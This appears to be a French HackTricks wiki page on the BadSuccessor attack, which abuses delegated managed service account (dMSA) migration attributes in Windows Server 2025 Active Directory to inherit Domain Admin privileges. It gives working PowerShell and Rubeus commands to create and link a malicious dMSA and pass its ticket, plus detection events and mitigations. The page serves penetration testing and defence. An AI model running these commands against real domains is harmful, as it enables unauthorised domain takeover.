# BadSuccessor : Escalade de privilèges via l'abus de migration de dMSA délégué

{{#include ../../banners/hacktricks-training.md}}

## Aperçu

Les Comptes de Service Gérés Délégués (**dMSA**) sont le successeur de nouvelle génération des **gMSA** qui seront inclus dans Windows Server 2025. Un flux de travail de migration légitime permet aux administrateurs de remplacer un compte *ancien* (utilisateur, ordinateur ou compte de service) par un dMSA tout en préservant de manière transparente les autorisations. Le flux de travail est exposé via des cmdlets PowerShell telles que `Start-ADServiceAccountMigration` et `Complete-ADServiceAccountMigration` et repose sur deux attributs LDAP de l'**objet dMSA** :

* **`msDS-ManagedAccountPrecededByLink`** – *lien DN* vers le compte remplacé (ancien).
* **`msDS-DelegatedMSAState`**       – état de migration (`0` = aucun, `1` = en cours, `2` = *terminé*).

Si un attaquant peut créer **n'importe quel** dMSA à l'intérieur d'une OU et manipuler directement ces 2 attributs, LSASS et le KDC traiteront le dMSA comme un *successeur* du compte lié. Lorsque l'attaquant s'authentifie ensuite en tant que dMSA, **il hérite de tous les privilèges du compte lié** – jusqu'à **Administrateur de Domaine** si le compte Administrateur est lié.

Cette technique a été nommée **BadSuccessor** par l'Unité 42 en 2025. Au moment de la rédaction, **aucun correctif de sécurité** n'est disponible ; seule le renforcement des autorisations d'OU atténue le problème.

### Prérequis d'attaque

1. Un compte qui est *autorisé* à créer des objets à l'intérieur **d'une Unité Organisationnelle (OU)** *et* possède au moins l'un des éléments suivants :
* `Create Child` → **`msDS-DelegatedManagedServiceAccount`** classe d'objet
* `Create Child` → **`All Objects`** (création générique)
2. Connectivité réseau à LDAP & Kerberos (scénario standard de domaine joint / attaque à distance).

## Énumération des OUs vulnérables

L'Unité 42 a publié un script d'assistance PowerShell qui analyse les descripteurs de sécurité de chaque OU et met en évidence les ACEs requis :
```powershell
Get-BadSuccessorOUPermissions.ps1 -Domain contoso.local
```
Sous le capot, le script exécute une recherche LDAP paginée pour `(objectClass=organizationalUnit)` et vérifie chaque `nTSecurityDescriptor` pour

* `ADS_RIGHT_DS_CREATE_CHILD` (0x0001)
* `ID de schéma Active Directory : 31ed51fa-77b1-4175-884a-5c6f3f6f34e8` (classe d'objet *msDS-DelegatedManagedServiceAccount*)

## Étapes d'exploitation

Une fois qu'une OU écrivable est identifiée, l'attaque n'est qu'à 3 écritures LDAP :
```powershell
# 1. Create a new delegated MSA inside the delegated OU
New-ADServiceAccount -Name attacker_dMSA \
-DNSHostName host.contoso.local \
-Path "OU=DelegatedOU,DC=contoso,DC=com"

# 2. Point the dMSA to the target account (e.g. Domain Admin)
Set-ADServiceAccount attacker_dMSA -Add \
@{msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=contoso,DC=com"}

# 3. Mark the migration as *completed*
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```
Après la réplication, l'attaquant peut simplement **se connecter** en tant que `attacker_dMSA$` ou demander un TGT Kerberos – Windows construira le jeton du compte *supplanté*.

### Automatisation

Plusieurs PoC publics englobent l'ensemble du flux de travail, y compris la récupération de mot de passe et la gestion des tickets :

* SharpSuccessor (C#) – [https://github.com/logangoins/SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
* BadSuccessor.ps1 (PowerShell) – [https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
* Module NetExec – `badsuccessor` (Python) – [https://github.com/Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec)

### Post-Exploitation
```powershell
# Request a TGT for the dMSA and inject it (Rubeus)
Rubeus asktgt /user:attacker_dMSA$ /password:<ClearTextPwd> /domain:contoso.local
Rubeus ptt /ticket:<Base64TGT>

# Access Domain Admin resources
dir \\DC01\C$
```
## Détection & Chasse

Activez **l'audit des objets** sur les UOs et surveillez les événements de sécurité Windows suivants :

* **5137** – Création de l'objet **dMSA**
* **5136** – Modification de **`msDS-ManagedAccountPrecededByLink`**
* **4662** – Changements d'attributs spécifiques
* GUID `2f5c138a-bd38-4016-88b4-0ec87cbb4919` → `msDS-DelegatedMSAState`
* GUID `a0945b2b-57a2-43bd-b327-4d112a4e8bd1` → `msDS-ManagedAccountPrecededByLink`
* **2946** – Délivrance de TGT pour le dMSA

La corrélation de `4662` (modification d'attribut), `4741` (création d'un compte ordinateur/service) et `4624` (connexion subséquente) met rapidement en évidence l'activité BadSuccessor. Les solutions XDR telles que **XSIAM** sont livrées avec des requêtes prêtes à l'emploi (voir les références).

## Atténuation

* Appliquez le principe du **moindre privilège** – ne déléguez la gestion des *comptes de service* qu'à des rôles de confiance.
* Supprimez `Create Child` / `msDS-DelegatedManagedServiceAccount` des UOs qui ne l'exigent pas explicitement.
* Surveillez les ID d'événements listés ci-dessus et alertez sur les identités *non-Tier-0* créant ou modifiant des dMSA.

## Voir aussi


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

## Références

- [Unit42 – When Good Accounts Go Bad: Exploiting Delegated Managed Service Accounts](https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/)
- [SharpSuccessor PoC](https://github.com/logangoins/SharpSuccessor)
- [BadSuccessor.ps1 – Pentest-Tools-Collection](https://github.com/LuemmelSec/Pentest-Tools-Collection/blob/main/tools/ActiveDirectory/BadSuccessor.ps1)
- [NetExec BadSuccessor module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

{{#include ../../banners/hacktricks-training.md}}
